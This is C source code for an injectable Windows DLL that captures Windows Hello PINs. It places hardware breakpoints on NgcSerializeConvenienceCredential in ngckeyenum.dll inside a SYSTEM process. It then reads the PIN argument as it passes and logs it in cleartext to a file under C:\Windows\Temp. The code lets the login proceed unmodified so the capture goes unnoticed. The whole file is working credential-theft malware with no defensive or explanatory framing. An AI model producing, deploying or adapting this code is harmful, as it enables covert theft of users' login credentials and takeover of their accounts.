#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>

/* Output log. Must be writable by the (SYSTEM) host process; C:\Windows\Temp works. */
static const wchar_t* LOGPATH = L"C:\\Windows\\Temp\\pin_capture.log";
static void*          g_target   = NULL;
static volatile LONG  g_captured = 0;
static char           g_pin[64];
static PVOID          g_veh      = NULL;

static void logLine(const wchar_t* s)
{
    HANDLE h = CreateFileW(LOGPATH, FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    DWORD w; WriteFile(h, s, lstrlenW(s)*sizeof(wchar_t), &w, NULL);
    static const wchar_t nl[] = L"\r\n";
    WriteFile(h, nl, sizeof(nl)-sizeof(wchar_t), &w, NULL);
    CloseHandle(h);
}

/* Vectored handler: on the execute-BP hit, read the PIN arg and resume unmodified. */
static LONG CALLBACK Veh(EXCEPTION_POINTERS* ep)
{
    CONTEXT* c = ep->ContextRecord;
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        (void*)c->Rip == g_target)
    {
        if (!g_captured) {
            __try {
                void* a1  = (void*)c->Rcx;                       /* {type; buf; len} */
                void* buf = *(void**)((BYTE*)a1 + 8);
                DWORD len = *(DWORD*)((BYTE*)a1 + 16);
                if (buf && len >= 1 && len <= 63) {
                    int i = 0;
                    for (; i < (int)len && i < 63; ++i) {
                        char ch = ((char*)buf)[i];
                        if (ch < 0x20 || ch > 0x7e) break;
                        g_pin[i] = ch;
                    }
                    g_pin[i] = 0;
                    if (i >= 1) InterlockedExchange(&g_captured, 1);
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { }
        }
        c->EFlags |= 0x10000;                 /* set RF: execute the real instruction next */
        return EXCEPTION_CONTINUE_EXECUTION;  /* original code runs unmodified -> login OK */
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* set (on=TRUE) or clear the DR0 execute breakpoint on every OTHER thread of this proc */
static void setDR(BOOL on)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    THREADENTRY32 te; te.dwSize = sizeof(te);
    DWORD me = GetCurrentProcessId(), myTid = GetCurrentThreadId();
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == me && te.th32ThreadID != myTid) {
                HANDLE h = OpenThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME,
                                      FALSE, te.th32ThreadID);
                if (h) {
                    if (SuspendThread(h) != (DWORD)-1) {
                        CONTEXT c; c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        if (GetThreadContext(h, &c)) {
                            if (on) {
                                c.Dr0 = (DWORD64)g_target;
                                c.Dr7 = (c.Dr7 & ~0xF0003ULL) | 0x1ULL; /* L0=1, exec, len1 */
                            } else {
                                if (c.Dr0 == (DWORD64)g_target) { c.Dr0 = 0; c.Dr7 &= ~0x1ULL; }
                            }
                            c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                            SetThreadContext(h, &c);
                        }
                        ResumeThread(h);
                    }
                    CloseHandle(h);
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
}

static DWORD WINAPI worker(LPVOID u)
{
    (void)u;
    g_veh = AddVectoredExceptionHandler(1, Veh);
    HMODULE m = GetModuleHandleW(L"ngckeyenum.dll");
    if (!m) m = LoadLibraryW(L"ngckeyenum.dll");
    g_target = m ? (void*)GetProcAddress(m, "NgcSerializeConvenienceCredential") : NULL;
    if (!g_target) { logLine(L"[ngccap-hwbp] target not found"); return 1; }
    { wchar_t s[128]; wsprintfW(s, L"[ngccap-hwbp] armed (non-intrusive) target=%p", g_target); logLine(s); }

    /* keep the BP applied across (re)created threads until we capture, then remove it */
    int loops = 0;
    while (!g_captured && loops < 1200) { setDR(TRUE); Sleep(250); ++loops; }
    Sleep(250);
    setDR(FALSE);
    if (g_veh) RemoveVectoredExceptionHandler(g_veh);
    if (g_captured) {
        wchar_t s[160]; int i = 0;
        for (; g_pin[i] && i < 63; ++i) s[i] = (wchar_t)g_pin[i];
        s[i] = 0;
        wchar_t line[220]; wsprintfW(line, L">>> PIN CAPTURED (non-intrusive) = \"%s\"", s);
        logLine(line);
    } else {
        logLine(L"[ngccap-hwbp] removed, no capture (timeout)");
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r)
{
    (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        { wchar_t s[64]; wsprintfW(s, L"[ngccap-hwbp] attach pid=%lu", GetCurrentProcessId()); logLine(s); }
        CreateThread(NULL, 0, worker, NULL, 0, NULL);
    }
    return TRUE;
}
